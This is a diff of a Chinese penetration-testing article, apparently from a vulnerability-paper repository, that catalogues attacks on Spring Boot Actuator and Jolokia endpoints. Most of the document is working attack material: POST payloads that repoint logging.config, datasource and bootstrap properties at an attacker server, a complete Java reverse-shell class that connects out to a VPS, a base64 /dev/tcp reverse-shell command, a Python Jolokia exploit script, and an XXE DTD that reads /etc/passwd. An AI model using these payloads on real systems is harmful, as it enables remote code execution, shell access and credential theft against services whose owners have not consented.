@@ -1,5 +1,5 @@
 ---
-version: "javac -source 1.5 -target 1.5 JNDIObject.java"
+version: "javac -source 1.5 -target 1.5 JNDIObject.java"
 source: "MrWQ/vulnerability-paper"
 ---
 
@@ -29,10 +29,10 @@ Spring 框架简述
 简述如下：
 
 ```
-Spring Framework
+Spring Framework
 核心架构：提供依赖注入（IoC）、面向切面编程（AOP）、数据访问和事务管理等基础功能。
-Spring MVC：用于构建Web应用程序和RESTful服务的MVC框架。
-Spring MVC
+Spring MVC：用于构建Web应用程序和RESTful服务的MVC框架。
+Spring MVC
 Web框架：基于SpringFramework的模块，用于开发Web应用和API。
 主要特性：DispatcherServlet、注解驱动、视图解析等。
 SpringBoot
@@ -45,8 +45,8 @@ SpringSecurity
 安全框架：为Spring应用提供认证和授权功能。
 主要特性：身份验证、访问控制、Web安全保护。
 它们的关系
-SpringFramework：基础框架，包含核心功能和Spring MVC。
-Spring MVC：SpringFramework中的Web框架模块。
+SpringFramework：基础框架，包含核心功能和Spring MVC。
+Spring MVC：SpringFramework中的Web框架模块。
 SpringBoot：简化Spring应用开发，内置于SpringFramework之上。
 SpringCloud：基于SpringBoot，支持微服务架构。
 SpringSecurity：集成在SpringFramework中，提供安全功能。
@@ -58,19 +58,19 @@ Spring Boot Starter
 
 `如果只是将xml配置换成javaconfig配置，其实减少不了配置的工作量。我们配置工作量的减少，还得感谢Spring Boot Starter，是它帮我们完成了大量的配置工作，我们只需完成很少一部分配置即可。`
 
-springboot 自动配置用到的注解 `@SpringBootApplication、@SpringBootConfiguration、@ComponentScan @EnableAutoConfiguration、@AutoConfigrationPackage、@EnableConfigurationProperties`  
-外部配置文件导入注解 `@PropertySource`  
-定时任务用到注解 `@EnableScheduling、@Scheduled、@EnableAsync、@Async`  
-过滤器 `@WebFilter、@ServletComponentScan`  
+springboot 自动配置用到的注解 `@SpringBootApplication、@SpringBootConfiguration、@ComponentScan @EnableAutoConfiguration、@AutoConfigrationPackage、@EnableConfigurationProperties`  
+外部配置文件导入注解 `@PropertySource`  
+定时任务用到注解 `@EnableScheduling、@Scheduled、@EnableAsync、@Async`  
+过滤器 `@WebFilter、@ServletComponentScan`  
 拦截器  
 监听器  
-校验器 `@Validated`  
-异常处理 `@ControllerAdvice、@ExceptionHandler`
+校验器 `@Validated`  
+异常处理 `@ControllerAdvice、@ExceptionHandler`
 
 自动加载原理：  
-SpringBoot 在启动时会去依赖的`starter`包中寻找 `resources/META- INF/spring.factories`文件，然后根据文件中配置的 Jar 包去扫描项目所依赖的 Jar 包，这类似于 Java 的 SPI 机制。注释：SPI 的英文名称是 Service Provider Interface，是 Java 内置的服务发现机制。  
+SpringBoot 在启动时会去依赖的`starter`包中寻找 `resources/META- INF/spring.factories`文件，然后根据文件中配置的 Jar 包去扫描项目所依赖的 Jar 包，这类似于 Java 的 SPI 机制。注释：SPI 的英文名称是 Service Provider Interface，是 Java 内置的服务发现机制。  
 根据`spring.factories`配置加载`AutoConfigure`类。  
-根据 `@Conditional注解`的条件，进行自动配置并将 Bean 注入`Spring Context`上下文当中
+根据 `@Conditional注解`的条件，进行自动配置并将 Bean 注入`Spring Context`上下文当中
 
 springboot-cve_2021_21234
 =========================
@@ -117,29 +117,29 @@ SpringCloud
 
 ### 敏感信息明文获取
 
-如果说目标网站存在一些接口依赖 `jolokia-cor`  
+如果说目标网站存在一些接口依赖 `jolokia-cor`  
 如`/jolokia`、`/actuator/jolokia`
 
-*   • **调用 org.springframework.boot Mbean**
+*   • **调用 org.springframework.boot Mbean**
     
 
 实际上是调用`org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty`方法  
 `poc`
 
 ```
-//spring 1.x 版本
+//spring 1.x 版本
 
 markup
-POST /jolokia
-Content-Type: application/json
+POST /jolokia
+Content-Type: application/json
 
 {"mbean":"org.springframework.boot::["security.user.password"]}
 
-//spring 2.x 版本
+//spring 2.x 版本
 
 markup
-POST /actuator/jolokia
-Content-Type: application/json
+POST /actuator/jolokia
+Content-Type: application/json
 
 {"mbean":"org.springframework.boot::["security.user.password"]}
 
@@ -152,7 +152,7 @@ Content-Type: application/json
 Spring Boot whitelabel error page 远程命令执行漏
 =========================================
 
-漏洞原理：主要是因为使用了`springboot默认错误页`在处理参数值使用递归流程，流程进入到`PropertyPlaceholderHelper` 类中，`${}`包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞  
+漏洞原理：主要是因为使用了`springboot默认错误页`在处理参数值使用递归流程，流程进入到`PropertyPlaceholderHelper` 类中，`${}`包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞  
 漏洞文件：`ErrorMvcAutoConfiguration.java`
 
 漏洞复现，测试网站是否存在`Whitelabel Error Page`，通过`fuzz`一些参数值，如`id、sid`存在`500报错`，则可以测试去执行`Spel表达式注入`
@@ -163,14 +163,14 @@ Spring Boot whitelabel error page 远程命令执行漏
 生成 16 进制的脚本
 
 ```
-input_string = "open -a Calculator"
-hex_list =[]
+input_string = "open -a Calculator"
+hex_list =[]
 
-for ch in input_string:
-# 将字符转换为十六进制表示，并添加到列表中
-    hex_list.append(f"0x{ord(ch):02x}")
+for ch in input_string:
+# 将字符转换为十六进制表示，并添加到列表中
+    hex_list.append(f"0x{ord(ch):02x}")
 
-hex_string =', '.join(hex_list)
+hex_string =', '.join(hex_list)
 print(hex_string)
 
 
@@ -188,7 +188,7 @@ spring cloud SnakeYAML 远程命令执行
 
 利用条件：通过去查看是否存在`/env 或 /actuator/env`泄露，请求是否存在`spring-boot-starter- actuator`，目标主机可出网，且版本`小于1.3.0.RELEASE`  
 漏洞原理：  
-Spring Cloud 配置通过 `spring.cloud.bootstrap.location` 指向恶意 YML 文件 URL，触发 refresh 请求该文件，利用 SnakeYAML 反序列化漏洞拉取恶意 JAR 并实例化其中的 javax.script.ScriptEngineFactory 实现类，导致远程代码执行（RCE）。
+Spring Cloud 配置通过 `spring.cloud.bootstrap.location` 指向恶意 YML 文件 URL，触发 refresh 请求该文件，利用 SnakeYAML 反序列化漏洞拉取恶意 JAR 并实例化其中的 javax.script.ScriptEngineFactory 实现类，导致远程代码执行（RCE）。
 
 漏洞复现过程：
 
@@ -197,25 +197,25 @@ Spring Cloud 配置通过 `spring.cloud.bootstrap.location` 指向恶意 YML �
 参考：https://github.com/artsploit/yaml-payload
 
 ```
-javac src/artsploit/AwesomeScriptEngineFactory.java
-jar -cvf yaml-payload.jar -C src/ .
+javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
 
 ```
 
 2、设置`spring.cloud.bootstrap.location 属性`
 
-构造`poc`如下，分为`spring1.x` 和 `spring2.x`
+构造`poc`如下，分为`spring1.x` 和 `spring2.x`
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 spring.cloud.bootstrap.location=http://vps:port/exp.yml
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/x-www-form-urlencoded
+//spring 2.x
+POST /actuator/env
+Content-Type: application/x-www-form-urlencoded
 
 spring.cloud.bootstrap.location=http://vps:port/exp.yml
 
@@ -226,13 +226,13 @@ spring.cloud.bootstrap.location=http://vps:port/exp.yml
 `poc`如下
 
 ```
-//spring 1.x
-POST /refresh
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /refresh
+Content-Type: application/x-www-form-urlencoded
 
-//spring 2.x
-POST /actuator/refresh
-Content-Type: application/x-www-form-urlencoded
+//spring 2.x
+POST /actuator/refresh
+Content-Type: application/x-www-form-urlencoded
 
 ```
 
@@ -251,36 +251,36 @@ springboot mysql jdbc deserialization 远程代码执行
 
 漏洞利用：  
 根据属性条件进行修改调用`mysql jdbc`，判断具体情况利用，未授权可能影响业务数据，流程如下  
-不同版本`mysql-connector-java 5.x` 和 `mysql-connector-java 8.x`，`poc`如下
+不同版本`mysql-connector-java 5.x` 和 `mysql-connector-java 8.x`，`poc`如下
 
 ```
-//mysql-connector-java 5.x
+//mysql-connector-java 5.x
 jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
 
-//mysql-connector-java 8.x
+//mysql-connector-java 8.x
 jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
 
 ```
 
-同理判断是否存在 `/env` 或`/actuator/env`
+同理判断是否存在 `/env` 或`/actuator/env`
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.url=对应属性值
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/json
+//spring 2.x
+POST /actuator/env
+Content-Type: application/json
 
 {"name":"spring.datasource.url","value":"对应属性值"}
 
 ```
 
 修改完成后进行刷新配置，再触发即可  
-访问 `/refresh`或`/actuator/refresh`刷新配置，最后触发查询，访问`/product/list`去触发漏洞，如果没有则需要找其他`数据库查询接口`
+访问 `/refresh`或`/actuator/refresh`刷新配置，最后触发查询，访问`/product/list`去触发漏洞，如果没有则需要找其他`数据库查询接口`
 
 修复业务：需要还原`spring.datasource.url`的`value`值为初始的，以防损害业务！！
 
@@ -306,8 +306,8 @@ https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0
 1、下载后放入`vps`中加载，运行命令如下，注意这里版本需要`java8`环境
 
 ```
-//执行：bash -i >& /dev/tcp/VPS/1234 0>&1 的Base64
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,反弹shell的base64}|{base64,-d}|{bash,-i}' -A VPS
+//执行：bash -i >& /dev/tcp/VPS/1234 0>&1 的Base64
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,反弹shell的base64}|{base64,-d}|{bash,-i}' -A VPS
 
 ```
 
@@ -339,7 +339,7 @@ jolokia logback JNDI 命令执行
 ```
 //文件内容如下
 <configuration>
-  <insertFromJNDI env-entry- />
+  <insertFromJNDI env-entry- />
 </configuration>
 
 ```
@@ -347,79 +347,79 @@ jolokia logback JNDI 命令执行
 2、 编写用来反弹 shell 的代码`JNDIObject.java`
 
 ```
-/** 运行
- *  javac -source 1.5 -target 1.5 JNDIObject.java
- *
- *  Build By LandGrey
- * */
+/** 运行
+ *  javac -source 1.5 -target 1.5 JNDIObject.java
+ *
+ *  Build By LandGrey
+ * */
 
-import java.io.File;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
+import java.io.File;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
 
 publicclassJNDIObject{
 static{
 try{
-String ip ="your-vps-ip";
-String port ="3333";//反弹shell端口
-String py_path =null;
-String[] cmd;
+String ip ="your-vps-ip";
+String port ="3333";//反弹shell端口
+String py_path =null;
+String[] cmd;
 if(!System.getProperty("os.name").toLowerCase().contains("windows")){
-String[] py_envs =newString[]{"/bin/python","/bin/python3","/usr/bin/python","/usr/bin/python3","/usr/local/bin/python","/usr/local/bin/python3"};
-for(int i =0; i < py_envs.length;++i){
-String py = py_envs[i];
+String[] py_envs =newString[]{"/bin/python","/bin/python3","/usr/bin/python","/usr/bin/python3","/usr/local/bin/python","/usr/local/bin/python3"};
+for(int i =0; i < py_envs.length;++i){
+String py = py_envs[i];
 if((newFile(py)).exists()){
-                        py_path = py;
+                        py_path = py;
 break;
 }
 }
-if(py_path !=null){
+if(py_path !=null){
 if((newFile("/bin/bash")).exists()){
-                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/bash\")"};
+                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/bash\")"};
 }else{
-                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/sh\")"};
+                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/sh\")"};
 }
 }else{
 if((newFile("/bin/bash")).exists()){
-                        cmd =newString[]{"/bin/bash"};
+                        cmd =newString[]{"/bin/bash"};
 }else{
-                        cmd =newString[]{"/bin/sh"};
+                        cmd =newString[]{"/bin/sh"};
 }
 }
 }else{
-                cmd =newString[]{"cmd.exe"};
+                cmd =newString[]{"cmd.exe"};
 }
-Process p =(newProcessBuilder(cmd)).redirectErrorStream(true).start();
-Socket s =newSocket(ip,Integer.parseInt(port));
-InputStream pi = p.getInputStream();
-InputStream pe = p.getErrorStream();
-InputStream si = s.getInputStream();
-OutputStream po = p.getOutputStream();
-OutputStream so = s.getOutputStream();
+Process p =(newProcessBuilder(cmd)).redirectErrorStream(true).start();
+Socket s =newSocket(ip,Integer.parseInt(port));
+InputStream pi = p.getInputStream();
+InputStream pe = p.getErrorStream();
+InputStream si = s.getInputStream();
+OutputStream po = p.getOutputStream();
+OutputStream so = s.getOutputStream();
 while(!s.isClosed()){
 while(pi.available()>0){
-                    so.write(pi.read());
+                    so.write(pi.read());
 }
 while(pe.available()>0){
-                    so.write(pe.read());
+                    so.write(pe.read());
 }
 while(si.available()>0){
-                    po.write(si.read());
+                    po.write(si.read());
 }
-                so.flush();
-                po.flush();
+                so.flush();
+                po.flush();
 Thread.sleep(50L);
 try{
-                    p.exitValue();
+                    p.exitValue();
 break;
-}catch(Exception e){
+}catch(Exception e){
 }
 }
-            p.destroy();
-            s.close();
-}catch(Throwable e){
-            e.printStackTrace();
+            p.destroy();
+            s.close();
+}catch(Throwable e){
+            e.printStackTrace();
 }
 }
 }
@@ -429,8 +429,8 @@ break;
 这里需要用低版本`兼容运行`
 
 ```
-javac -source 1.5 -target 1.5 JNDIObject.java
-//生成JNDIObject.class 拷贝到vps根目录
+javac -source 1.5 -target 1.5 JNDIObject.java
+//生成JNDIObject.class 拷贝到vps根目录
 
 ```
 
@@ -439,7 +439,7 @@ javac -source 1.5 -target 1.5 JNDIObject.java
 利用项目：https://github.com/mbechler/marshalsec，命令如下
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://VPS:port/#JNDIObject 1389
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://VPS:port/#JNDIObject 1389
 
 ```
 
@@ -460,88 +460,88 @@ jolokia Realm JNDI 命令执行
 利用条件和上面差不多，访问接口`/jolokia 或 /actuator/jolokia`
 
 漏洞利用：  
-流程如下：访问 `/actuator/jolokia/list` 路由搜索 `logback` 和 `reloadByURL`, 发现目标未启用 logback 组件。在 jolokia-realm-jndi-rce 中使用 `marshalsec-0.0.3-SNAPSHOT-all.jar`来进行 `JNDI 注入`，依赖于目标使用的 JDK 版本，对于 OracleJDK11.0.1、8u191、7u201、6u211 或者更高版本的 JDK, 限制加载远程 codebase.
+流程如下：访问 `/actuator/jolokia/list` 路由搜索 `logback` 和 `reloadByURL`, 发现目标未启用 logback 组件。在 jolokia-realm-jndi-rce 中使用 `marshalsec-0.0.3-SNAPSHOT-all.jar`来进行 `JNDI 注入`，依赖于目标使用的 JDK 版本，对于 OracleJDK11.0.1、8u191、7u201、6u211 或者更高版本的 JDK, 限制加载远程 codebase.
 
-1、 访问 `/jolokia/list`接口，查看是否存在 `type=MBeanFactory`和 `createJNDIRealm` 关键词，编写用来反弹 shell 的代码`JNDIObject.java`，将编译好的`class`文件放到网站根目录
+1、 访问 `/jolokia/list`接口，查看是否存在 `type=MBeanFactory`和 `createJNDIRealm` 关键词，编写用来反弹 shell 的代码`JNDIObject.java`，将编译好的`class`文件放到网站根目录
 
 ```
-javac -source 1.5 -target 1.5 JNDIObject.java
+javac -source 1.5 -target 1.5 JNDIObject.java
 
 ```
 
 2、 利用`marshalsec`开启恶意的`rmi服务`
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://vps:port/#JNDIObject 1389
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://vps:port/#JNDIObject 1389
 
 ```
 
 3、 开启监听端口`3333`，调用进行加载触发，利用`exp`如下
 
 ```
-#!/usr/bin/env python3
+#!/usr/bin/env python3
 
-import requests
-
-
-url ='http://地址/jolokia'
+import requests
 
 
-create_realm ={
+url ='http://地址/jolokia'
+
+
+create_realm ={
 "mbean":"Tomcat:type=MBeanFactory",
 "type":"EXEC",
 "operation":"createJNDIRealm",
 "arguments":["Tomcat:type=Engine"]
 }
 
-wirte_factory ={
+wirte_factory ={
 "mbean":"Tomcat:realmPath=/realm0,type=Realm",
 "type":"WRITE",
 "attribute":"contextFactory",
 "value":"com.sun.jndi.rmi.registry.RegistryContextFactory"
 }
 
-write_url ={
+write_url ={
 "mbean":"Tomcat:realmPath=/realm0,type=Realm",
 "type":"WRITE",
 "attribute":"connectionURL",
 "value":"rmi://your-vps-ip:1389/JNDIObject"
 }
 
-stop ={
+stop ={
 "mbean":"Tomcat:realmPath=/realm0,type=Realm",
 "type":"EXEC",
 "operation":"stop",
 "arguments":[]
 }
 
-start ={
+start ={
 "mbean":"Tomcat:realmPath=/realm0,type=Realm",
 "type":"EXEC",
 "operation":"start",
 "arguments":[]
 }
 
-flow =[create_realm, wirte_factory, write_url, stop, start]
+flow =[create_realm, wirte_factory, write_url, stop, start]
 
-for i in flow:
-print('%s MBean %s: %s ...'%(i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
-    r = requests.post(url, json=i)
-    r.json()
+for i in flow:
+print('%s MBean %s: %s ...'%(i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
+    r = requests.post(url, json=i)
+    r.json()
 print(r.status_code)
 
 ```
 
-命令：python3 `exp.py`
+命令：python3 `exp.py`
 
 jolokia XXE 任意文件读取
 ==================
 
 源码复现：`git clone [https://github.com/veracode-research/actuator- testbed.git](https://github.com/veracode-research/actuator-testbed.git)`  
 影响版本：Spring Boot 2.x  
-漏洞原因：该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。对于此漏洞，`Spring boot` 会把 `/! 解析成 /`，导致可以部署`xml`脚本进行远程加载解析  
+漏洞原因：该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。对于此漏洞，`Spring boot` 会把 `/! 解析成 /`，导致可以部署`xml`脚本进行远程加载解析  
 漏洞条件：  
-访问`/jolokia/list`接口，在页面搜索`logback`，查看是否存在`logback` 库提供的`reloadByURL`方法，根据响应页面存在`logback` 库提供的`reloadByURL`方法  
+访问`/jolokia/list`接口，在页面搜索`logback`，查看是否存在`logback` 库提供的`reloadByURL`方法，根据响应页面存在`logback` 库提供的`reloadByURL`方法  
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlRgW0ib5VwXFkzGFljVxxmT4JA3tibKAAS9wYY6tvJon3ZegKrrM3dlzg/640?wx_fmt=png&from=appmsg)
 
@@ -550,8 +550,8 @@ jolokia XXE 任意文件读取
 1、 在`vps`上创建`logback.xml`，内容如下
 
 ```
-<?xml version="1.0" encoding="utf-8" ?>
-<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://vps:4444/xxe.dtd">%remote;%int;]>
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://vps:4444/xxe.dtd">%remote;%int;]>
 <a>&trick;</a>
 
 ```
@@ -559,8 +559,8 @@ jolokia XXE 任意文件读取
 2、 创建一个外部实体文件`xxe.dtd`
 
 ```
-<!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
 
 ```
 
@@ -579,53 +579,53 @@ SpringBoot Actuator 之 restart logging.config grovvy 命令执行
 第一种：  
 简述：根据 springboot 相关文档说明：可通过 Spring 环境属性`logging.config`进一步设置配置文件的位置。  
 利用条件：存在`/actuator/restart`接口，存在`groovy依赖`  
-漏洞利用：关键代码在`org.springframework.boot.context.logging.LoggingApplicationListener#initialize()`方法中，`logback- classic 组`件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 groovy 结尾  
+漏洞利用：关键代码在`org.springframework.boot.context.logging.LoggingApplicationListener#initialize()`方法中，`logback- classic 组`件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 groovy 结尾  
 漏洞复现：
 
 1、远程加载`.groovy`文件，这里写入一个`exp.groovy`
 
 ```
 //VPS写入一个命令执行函数
-Runtime.getRuntime().exec("open -a Calculator")
+Runtime.getRuntime().exec("open -a Calculator")
 Runtime.getRuntime().exec("calc")
 
-python -m http.server 1234
+python -m http.server 1234
 
 ```
 
 2、设置`logging.config`属性，poc 如下
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 logging.config=http://vps:port/exp.groovy
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/json
+//spring 2.x
+POST /actuator/env
+Content-Type: application/json
 
 {"name":"logging.config","value":"http://vps:port/exp.groovy"}
 
 ```
 
-3、 最后访问`/restart`或 `/actuator/restart`重新应用即可加载命令执行。
+3、 最后访问`/restart`或 `/actuator/restart`重新应用即可加载命令执行。
 
 注意此操作会重启业务运行，请授权测试
 
 另一种姿势：`restart spring.main.sources groovy 命令执行`，同理也是需要`groovy依赖`，`poc`如下
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 spring.main.sources=http://vps:port/exp.groovy
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/json
+//spring 2.x
+POST /actuator/env
+Content-Type: application/json
 
 {"name":"spring.main.sources","value":"http://vps:port/exp.groovy"}
 
@@ -636,9 +636,9 @@ Content-Type: application/json
 SpringBoot Actuator 之 restart logback JNDI 命令执行
 ===============================================
 
-利用条件：`JNDI` 服务返回的 object 需要实现`javax.naming.spi.ObjectFactory 接口`，存在`/env`和`/restart`接口  
-spring actuator 1.x 开启 restart 需要配置: `endpoints.restart.enabled=true spring actuator`  
-spring actuator 2.x 开启 restart 需要配置: `management.endpoint.restart.enabled=true`
+利用条件：`JNDI` 服务返回的 object 需要实现`javax.naming.spi.ObjectFactory 接口`，存在`/env`和`/restart`接口  
+spring actuator 1.x 开启 restart 需要配置: `endpoints.restart.enabled=true spring actuator`  
+spring actuator 2.x 开启 restart 需要配置: `management.endpoint.restart.enabled=true`
 
 漏洞复现：
 
@@ -647,7 +647,7 @@ spring actuator 2.x 开启 restart 需要配置: `management.endpoint.restart.e
 ```
 //这里base64为命令执行语句
 <configuration>
-  <insertFromJNDI env-entry- />
+  <insertFromJNDI env-entry- />
 </configuration>
 
 ```
@@ -655,30 +655,30 @@ spring actuator 2.x 开启 restart 需要配置: `management.endpoint.restart.e
 2、`vps`上开启`ldap`服务并启动
 
 ```
-java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
+java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
 
 ```
 
 3、 请求`/env`去设置`logging.config`属性
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 logging.config=http://vps:port/exp.xml
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/json
+//spring 2.x
+POST /actuator/env
+Content-Type: application/json
 
 {"name":"logging.config","value":"http://vps:ip/exp.xml"}
 
 ```
 
-4、最后访问 `/restart` 或 `/actuator/restart`重启即可
+4、最后访问 `/restart` 或 `/actuator/restart`重启即可
 
-提：如果说存在相关 `tomcat` 版本的话，也可以用`javax.el.ELProcessor`作为 `Reference Factory`来绕过高版本 JDK 的限制。
+提：如果说存在相关 `tomcat` 版本的话，也可以用`javax.el.ELProcessor`作为 `Reference Factory`来绕过高版本 JDK 的限制。
 
 SpringBoot Actuator 之 restart logging.config grovvy 命令执行
 ========================================================
@@ -689,28 +689,28 @@ SpringBoot Actuator 之 restart logging.config grovvy 命令执行
 1、`vps`上进行存放`.sql`文件进行远程加载，内容如下
 
 ```
-CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','calc');
+CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','calc');
 
 ```
 
 2、设置`spring.datasource.data`属性
 
 ```
-//spring 1.x
-POST /env
-Content-Type: application/x-www-form-urlencoded
+//spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.data=http://vps:port/exp.sql
 
-//spring 2.x
-POST /actuator/env
-Content-Type: application/x-www-form-urlencoded
+//spring 2.x
+POST /actuator/env
+Content-Type: application/x-www-form-urlencoded
 
 spring.datasource.data=http://vps:port/exp.sql
 
 ```
 
-3、最终重启应用即可，访问`/restart`或 `/actutar/restart`接口
+3、最终重启应用即可，访问`/restart`或 `/actutar/restart`接口
 
 结：闲暇之余，学习总结一下`springboot`相关知识，路漫漫其修远兮，如若有误，欢迎师傅指出。
 
@@ -754,13 +754,13 @@ spring.datasource.data=http://vps:port/exp.sql
 
 **关注福利：**
 
-**回复 “****app****" 获取  app 渗透和 app 抓包教程**
+**回复 “****app****" 获取  app 渗透和 app 抓包教程**
 
 **回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**
 
-****回复 “漏洞库** **" 获取 最新漏洞 POC 库 (********1.2W+********)****
+****回复 “漏洞库** **" 获取 最新漏洞 POC 库 (********1.2W+********)****
 
-****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****
+****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****
 
 点个【 在看 】，你最好看
 
